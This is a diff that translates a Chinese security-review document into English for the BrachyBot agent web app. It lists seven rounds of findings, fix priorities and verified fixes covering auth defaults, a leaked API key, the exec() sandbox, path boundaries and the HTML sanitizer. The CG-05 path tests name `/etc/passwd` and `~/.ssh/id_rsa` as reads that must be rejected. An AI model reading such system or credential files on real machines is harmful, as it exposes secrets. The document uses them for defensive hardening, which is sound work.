+| `/home` path scope already fixed | It is currently `os.path.expanduser("~")`, still equivalent to allowing the entire `/home/user`. Reading medical data can be discussed, but the export write path and arbitrary file read endpoints are still too broad. |
+| H-10 SSE no heartbeat to be verified | Verified: `/api/tasks/stream` only emits a snapshot and ends; it is not a continuous task event stream. The `/api/chat` streaming response has a keep-alive header but no application-layer heartbeat. |
 
-### 修复优先级建议
+### Fix Priority Recommendations
 
-| 优先级 | 问题 | 建议修复 |
+| Priority | Issue | Recommended Fix |
 |--------|------|----------|
-| P0 | CG-02 明文 API key | 立即轮换 key；从 `start_server.sh` 删除；改用 shell 环境或 `.env` 且 `.gitignore`；清理 shell history/日志中泄露副本。 |
-| P0 | CG-01 默认无鉴权外网服务 | `main()` 默认 host 改回 `127.0.0.1`；只要 host 非 loopback 就强制要求 `BRACHYBOT_API_KEY`；所有 POST/导出/上传/viewer 数据接口统一加鉴权。 |
-| P0 | CG-03 CodeExecutor 沙箱失效 | 短期禁用或仅本地开发启用；移除 `os/sys/pathlib/__import__`；长期改为子进程/container + uid 隔离 + seccomp/ulimit + wall-clock timeout。 |
-| P1 | CG-05 路径边界 | 实现 `safe_join(base, user_path)`；读路径限制到 `uploads/` 和显式配置的数据目录；写路径限制到 `outputs/`；禁止 symlink escape。 |
-| P1 | CG-04 上传/截图 | 加 `@require_api_key`、`@rate_limit`、扩展名+magic bytes 校验、文件数量/累计容量限制、图片解码尺寸限制。 |
-| P1 | CG-07/CG-08 当前工作树回归 | 修正 unreachable OAR auto-recovery；CPU 时传 `--device cpu`，CUDA 时再传具体 `gpu:N`。 |
-| P2 | CG-09 并发状态 | 为每个 session/agent 加 `RLock`；长任务状态和 memory 更新走单线程队列或事务式 snapshot。 |
-| P2 | CG-11 前端 sanitizer | 引入 DOMPurify；所有非固定模板数据都用 `textContent` 或 `escHtml`；tooltip traceName 必须转义。 |
-| P2 | CG-12 CodeGraph 同步 | 排除 `uploads/`、`outputs/`、`memory/data/`、`tool_factory/web_search/evidence/`、venv；必要时提高 `fs.inotify.max_user_watches`。 |
+| P0 | CG-02 plaintext API key | Rotate the key immediately; remove it from `start_server.sh`; use shell environment or `.env` with `.gitignore`; clean up leaked copies in shell history/logs. |
+| P0 | CG-01 default no-auth external service | Change the default host in `main()` back to `127.0.0.1`; whenever the host is non-loopback, require `BRACHYBOT_API_KEY`; add auth uniformly to all POST/export/upload/viewer data endpoints. |
+| P0 | CG-03 CodeExecutor sandbox ineffective | Disable short-term or enable only for local development; remove `os/sys/pathlib/__import__`; long-term, switch to subprocess/container + uid isolation + seccomp/ulimit + wall-clock timeout. |
+| P1 | CG-05 path boundaries | Implement `safe_join(base, user_path)`; restrict read paths to `uploads/` and explicitly configured data directories; restrict write paths to `outputs/`; prohibit symlink escape. |
+| P1 | CG-04 upload/screenshot | Add `@require_api_key`, `@rate_limit`, extension + magic bytes validation, file count/cumulative size limits, and image decode size limits. |
+| P1 | CG-07/CG-08 current working-tree regressions | Fix the unreachable OAR auto-recovery; pass `--device cpu` for CPU and the specific `gpu:N` for CUDA. |
+| P2 | CG-09 concurrent state | Add an `RLock` to each session/agent; route long task state and memory updates through a single-threaded queue or transactional snapshot. |
+| P2 | CG-11 frontend sanitizer | Introduce DOMPurify; use `textContent` or `escHtml` for all non-fixed-template data; the tooltip traceName must be escaped. |
+| P2 | CG-12 CodeGraph sync | Exclude `uploads/`, `outputs/`, `memory/data/`, `tool_factory/web_search/evidence/`, and venv; raise `fs.inotify.max_user_watches` if necessary. |
 
-### 第七轮问题统计
+### Round 7 Issue Statistics
 
-| 严重度 | 数量 | 关键发现 |
+| Severity | Count | Key Findings |
 |--------|------|----------|
-| Critical | 3 | 默认外网无鉴权、明文 API key、CodeExecutor 沙箱失效 |
-| High | 5 | 上传/截图写入、路径边界、配置篡改、planning_pipeline 回归、OAR device 回归 |
-| Medium | 4 | 多线程状态竞态、TaskManager/SSE、前端 sanitizer、CodeGraph 同步可靠性 |
-| **总计** | **12** | |
+| Critical | 3 | Default external listening without auth, plaintext API key, CodeExecutor sandbox ineffective |
+| High | 5 | Upload/screenshot writes, path boundaries, config tampering, planning_pipeline regression, OAR device regression |
+| Medium | 4 | Multithreaded state races, TaskManager/SSE, frontend sanitizer, CodeGraph sync reliability |
+| **Total** | **12** | |
 
-**第七轮审查完成时间**: 2026-06-28
-**审查人**: Codex CodeGraph Review
-**审查覆盖**: CodeGraph DB + AST route scan + 高风险入口源码核验 + 当前工作树 diff
-**累计审查**: 7 轮 / 在前六轮基础上新增或重新确认 12 个问题
+**Round 7 Review Completion Time**: 2026-06-28
+**Reviewer**: Codex CodeGraph Review
+**Review Coverage**: CodeGraph DB + AST route scan + high-risk entry source verification + current working-tree diff
+**Cumulative Review**: 7 rounds / 12 issues newly added or reconfirmed on top of the first six rounds
 
 ---
 
-## 第七轮修复记录 (2026-06-28)
+## Round 7 Fix Record (2026-06-28)
 
-> 修复原则：逐项复核是否真实存在、是否属于有意设计；仅对确认存在且会扩大安全/正确性风险的问题做代码修复。对保留的能力改为显式启用或安全默认。
+> Fix principle: Review each item to determine whether it truly exists and whether it is intentional design; only make code fixes for issues that are confirmed to exist and would amplify security/correctness risk. Retained capabilities are changed to explicitly enabled or safe defaults.
 
-### 逐项复核与修复状态
+### Item-by-Item Review and Fix Status
 
-| # | 复核结论 | 修复内容 | 验证 |
+| # | Review Conclusion | Fix Content | Verification |
 |---|----------|----------|------|
-| CG-01 | 确认真问题。默认 `0.0.0.0` + 未配置 key 时鉴权 decorator 失效不是安全默认。 | `web/server.py` 默认 host 改为 `127.0.0.1`；非 loopback 监听在未设置 `BRACHYBOT_API_KEY` 时 fail-closed，除非显式设置 `BRACHYBOT_ALLOW_INSECURE_REMOTE=1`；补齐高风险 API 的 `@require_api_key`/`@rate_limit`。 | Flask test client 验证 `/api/config` 无 key 返回 401、有 key 返回 200；`run_server(host="0.0.0.0")` 无 key 被拒绝。 |
-| CG-02 | 确认真问题。启动脚本明文 key 没有必要且极易泄漏。 | `start_server.sh` 删除第三方 LLM key，改为只读取 shell 环境变量；默认只监听 `127.0.0.1`；远程监听无 `BRACHYBOT_API_KEY` 时退出；`start_server.sh` 加入 `.gitignore`。 | `bash -n start_server.sh` 通过；grep 检查未再出现 token 样式密钥或 assignment 模板。仍建议立即轮换曾经暴露过的 key。 |
-| CG-03 | 确认真问题。现有 `exec()` 不能称为沙箱。 | `code_executor` 默认禁用，必须设置 `BRACHYBOT_ENABLE_CODE_EXECUTOR=1` 才可运行；移除 `os/sys/pathlib/io` 等高风险模块；自定义 `__import__` 白名单；加强危险模式拦截；文档描述改为 restricted execution。 | 远端执行 `CodeExecutorTool()._execute(...)` 默认返回 `code_executor is disabled`；`py_compile` 通过。 |
-| CG-04 | 确认真问题。上传/截图属于写入面，应鉴权并限制内容。 | `/api/upload`、`/api/screenshot` 加鉴权和限流；上传限制文件数量和允许扩展名；截图仅接受 PNG data URL 或 PNG bytes，限制大小并校验 PNG 魔数。 | 静态检查确认 auth/限流和 PNG decoder 存在；`git diff --check` 通过。 |
-| CG-05 | 确认真问题。原 allowlist 把读写边界扩大到项目根和 home。 | 拆分 read/write roots；默认读取仅允许 uploads、`/tmp`、`/data` 和显式 `BRACHYBOT_DATA_ROOTS`；默认写入仅允许 output/outputs/screenshots、`/tmp` 和显式 `BRACHYBOT_OUTPUT_ROOTS`；`ct_path`、viewer load、导出路径统一走校验。 | 路径测试确认 `/etc/passwd`、`~/.ssh/id_rsa`、`/etc/brachybot-report.json` 被拒绝，uploads 可读，`./output/report.json` 解析到项目输出目录。 |
-| CG-06 | 确认真问题。`/api/config` 可影响计划参数，不能无鉴权 POST。 | `/api/config` GET/POST 补齐 `@require_api_key` 和 `@rate_limit`。 | Flask test client 验证无 key 401、有 key 200。 |
-| CG-07 | 确认真问题。当前工作树中的 OAR 早退会让 auto-recovery 不可达。 | 移除 `oar_mask is None` 的直接失败返回，保留 CTV 缺失的显式失败；OAR 缺失时重新进入原 auto-recovery 分支。 | 静态检查确认没有 OAR direct early return，且 `oar_segmentation` auto-recovery 调用仍存在。 |
-| CG-08 | 确认真问题。CPU fallback 映射到 GPU 会导致无 GPU 或禁用 GPU 时失败。 | `cuda:N` 映射为 `gpu:N`，裸 `cuda` 映射为 `gpu`，其他设备映射为 `cpu`。 | 静态检查确认 `cuda` 和 `cpu` 分支均存在。 |
-| CG-09 | 确认真问题。`threaded=True` 下 session/memory 多线程读写没有一致性保护。 | `web/server.py` 为 session map 增加 `RLock`；`AgenticSys.AgentMemory` 增加 `RLock`，对 store/retrieve/conversation/ui_state/export/clear/compact 等读写加锁或快照。 | `AgenticSys.py` 与 `web/server.py` 通过 `py_compile`；相关路由导入和 Flask client 验证通过。 |
-| CG-10 | 确认真问题。任务状态无 TTL 且 SSE 只是快照。 | `TaskManager` 增加 TTL、最大任务数、created/updated 时间和快照返回；`/api/tasks/stream` 改为短期持续流，发送变更事件和 heartbeat，并补充缓存禁用 header。 | 静态检查和 `git diff --check` 通过。 |
-| CG-11 | 确认真问题，但范围校准为自研 sanitizer 不足和局部未转义。 | 前端增加 `/api/*` fetch wrapper，可通过 `window.setBrachyBotApiKey(key)` 附加 `X-API-Key`；强化 `_sanitizeHtml()` 对危险标签、事件处理器、`href/src/xlink:href` 协议和 inline style payload 的过滤；DVH tooltip 对 `traceName` 和颜色做转义/校验。 | 静态检查确认 API key wrapper、`escHtml(traceName)`、URL/style sanitizer 存在。长期仍建议引入 DOMPurify 处理任意 HTML。 |
-| CG-12 | 确认真问题。生成文件和大目录会放大 CodeGraph watcher 压力。 | 新增 `.codegraphignore` 排除 `.codegraph/`、uploads/output/outputs/screenshots/test_screenshots、memory/data、web_search evidence/cache、case_memory cases、venv 和医学影像大文件；`.gitignore` 同步排除生成目录。 | `.codegraphignore` 纳入工作树；后续需重启或重新索引 CodeGraph 以应用新的 exclude 配置。 |
+| CG-01 | Confirmed real issue. Default `0.0.0.0` + auth decorator ineffective when no key is configured is not a safe default. | In `web/server.py`, changed the default host to `127.0.0.1`; non-loopback listening fails closed when `BRACHYBOT_API_KEY` is unset, unless `BRACHYBOT_ALLOW_INSECURE_REMOTE=1` is explicitly set; added `@require_api_key`/`@rate_limit` to high-risk APIs. | Flask test client verified `/api/config` returns 401 without a key and 200 with a key; `run_server(host="0.0.0.0")` without a key is rejected. |
+| CG-02 | Confirmed real issue. A plaintext key in the startup script is unnecessary and leaks easily. | Removed the third-party LLM key from `start_server.sh` and changed it to read only shell environment variables; defaults to listening only on `127.0.0.1`; exits on remote listening without `BRACHYBOT_API_KEY`; added `start_server.sh` to `.gitignore`. | `bash -n start_server.sh` passes; grep found no token-style keys or assignment templates. Still recommend rotating any key ever exposed. |
+| CG-03 | Confirmed real issue. The existing `exec()` cannot be called a sandbox. | `code_executor` is disabled by default and only runs when `BRACHYBOT_ENABLE_CODE_EXECUTOR=1` is set; removed high-risk modules such as `os/sys/pathlib/io`; custom `__import__` whitelist; strengthened dangerous pattern interception; documentation changed to "restricted execution". | Remote execution of `CodeExecutorTool()._execute(...)` returns `code_executor is disabled` by default; `py_compile` passes. |
+| CG-04 | Confirmed real issue. Upload/screenshot are write surfaces and should require auth and limit content. | Added auth and rate limiting to `/api/upload` and `/api/screenshot`; uploads limit file count and allowed extensions; screenshots accept only PNG data URLs or PNG bytes, with size limits and PNG magic number validation. | Static check confirmed auth/rate limiting and PNG decoder exist; `git diff --check` passes. |
+| CG-05 | Confirmed real issue. The original allowlist expanded read/write boundaries to the project root and home. | Split read/write roots; default reads allow only uploads, `/tmp`, `/data`, and explicitly configured `BRACHYBOT_DATA_ROOTS`; default writes allow only output/outputs/screenshots, `/tmp`, and explicitly configured `BRACHYBOT_OUTPUT_ROOTS`; `ct_path`, viewer load, and export paths all go through validation. | Path tests confirmed `/etc/passwd`, `~/.ssh/id_rsa`, and `/etc/brachybot-report.json` are rejected, uploads are readable, and `./output/report.json` resolves to the project output directory. |
+| CG-06 | Confirmed real issue. `/api/config` can affect planning parameters and must not be an unauthenticated POST. | Added `@require_api_key` and `@rate_limit` to `/api/config` GET/POST. | Flask test client verified 401 without a key and 200 with a key. |
+| CG-07 | Confirmed real issue. The OAR early return in the current working tree makes auto-recovery unreachable. | Removed the direct failure return for `oar_mask is None`, retained the explicit failure for missing CTV; when OAR is missing, re-enters the original auto-recovery branch. | Static check confirmed no direct OAR early return and that the `oar_segmentation` auto-recovery call still exists. |
+| CG-08 | Confirmed real issue. Mapping CPU fallback to GPU causes failure when no GPU is available or the GPU is disabled. | `cuda:N` maps to `gpu:N`, bare `cuda` maps to `gpu`, and other devices map to `cpu`. | Static check confirmed both `cuda` and `cpu` branches exist. |
+| CG-09 | Confirmed real issue. Under `threaded=True`, session/memory multithreaded reads and writes have no consistency protection. | Added an `RLock` for the session map in `web/server.py`; added an `RLock` to `AgenticSys.AgentMemory`, locking or snapshotting store/retrieve/conversation/ui_state/export/clear/compact reads and writes. | `AgenticSys.py` and `web/server.py` pass `py_compile`; related route imports and Flask client verification pass. |
+| CG-10 | Confirmed real issue. Task state has no TTL and the SSE is only a snapshot. | Added TTL, maximum task count, created/updated times, and snapshot return to `TaskManager`; changed `/api/tasks/stream` to a short-lived continuous stream that sends change events and heartbeats, plus cache-disabling headers. | Static check and `git diff --check` pass. |
+| CG-11 | Confirmed real issue, but the scope is calibrated to an insufficient custom sanitizer and local missing escaping. | Added an `/api/*` fetch wrapper to the frontend so `X-API-Key` can be attached via `window.setBrachyBotApiKey(key)`; strengthened `_sanitizeHtml()` filtering of dangerous tags, event handlers, `href/src/xlink:href` protocols, and inline style payloads; escaped/validated `traceName` and colors in the DVH tooltip. | Static check confirmed the API key wrapper, `escHtml(traceName)`, and URL/style sanitizers exist. Long-term, introducing DOMPurify to handle arbitrary HTML is still recommended. |
+| CG-12 | Confirmed real issue. Generated files and large directories amplify CodeGraph watcher pressure. | Added `.codegraphignore` to exclude `.codegraph/`, uploads/output/outputs/screenshots/test_screenshots, memory/data, web_search evidence/cache, case_memory cases, venv, and large medical imaging files; `.gitignore` excludes generated directories in sync. | `.codegraphignore` is added to the working tree; CodeGraph must be restarted or re-indexed afterward to apply the new exclude configuration. |
 
-### 本轮验证记录
+### Verification Record for This Round
 
-- 语法检查：`python -m py_compile web/server.py AgenticSys.py tool_factory/code_executor/__init__.py tool_factory/seed_plan/planning_pipeline.py tool_factory/OAR_seg/totalsegmentator_oar.py`
-- 安全默认：`code_executor` 默认禁用；远程监听无 `BRACHYBOT_API_KEY` 时 fail-closed。
-- 鉴权回归：`/api/config` 在设置 `BRACHYBOT_API_KEY` 后，无 `X-API-Key` 返回 401，有正确 key 返回 200。
-- 路径边界：确认敏感系统路径和 home 私钥路径被拒绝，uploads 读路径和项目 output 写路径按预期允许。
-- 静态回归：确认 OAR auto-recovery 可达、TotalSegmentator CPU/CUDA 设备映射正确、前端 API key wrapper 与 tooltip 转义存在、启动脚本无明文 key。
-- Diff 检查：`git diff --check` 对本轮修改文件通过。
+- Syntax check: `python -m py_compile web/server.py AgenticSys.py tool_factory/code_executor/__init__.py tool_factory/seed_plan/planning_pipeline.py tool_factory/OAR_seg/totalsegmentator_oar.py`
+- Safe defaults: `code_executor` is disabled by default; remote listening without `BRACHYBOT_API_KEY` fails closed.
+- Auth regression: after setting `BRACHYBOT_API_KEY`, `/api/config` returns 401 without `X-API-Key` and 200 with the correct key.
+- Path boundaries: confirmed sensitive system paths and home private key paths are rejected, while the uploads read path and project output write path are allowed as expected.
+- Static regression: confirmed OAR auto-recovery is reachable, TotalSegmentator CPU/CUDA device mapping is correct, the frontend API key wrapper and tooltip escaping exist, and the startup script has no plaintext key.
+- Diff check: `git diff --check` passes for the files modified in this round.
 
-### 剩余注意事项
+### Remaining Cautions
 
-1. CG-02 的历史明文 key 必须轮换；本轮只能移除当前工作树中的明文，不能撤销已经可能发生的泄漏。
-2. 如需外网访问 BrachyBot，必须显式设置 `BRACHYBOT_API_KEY` 并让前端通过 `window.setBrachyBotApiKey(...)` 写入本地 key；默认启动只面向本机 loopback。
-3. `code_executor` 现在是默认禁用的受限执行器，不是真正容器沙箱；若业务确需启用，仍建议后续改为子进程/container、低权限用户、资源限制和 wall-clock timeout。
-4. CodeGraph 的 watcher/exclude 配置需要 daemon 重启或重新索引后才会完全生效。
+1. The historical plaintext key from CG-02 must be rotated; this round can only remove the plaintext in the current working tree and cannot undo a leak that may already have occurred.
+2. If external access to BrachyBot is needed, `BRACHYBOT_API_KEY` must be explicitly set and the frontend must write the local key via `window.setBrachyBotApiKey(...)`; the default startup faces only the local loopback.
+3. `code_executor` is now a restricted executor disabled by default, not a true container sandbox; if the business genuinely needs it enabled, it is still recommended to move to a subprocess/container, a low-privilege user, resource limits, and a wall-clock timeout.
+4. The CodeGraph watcher/exclude configuration only fully takes effect after the daemon is restarted or re-indexed.
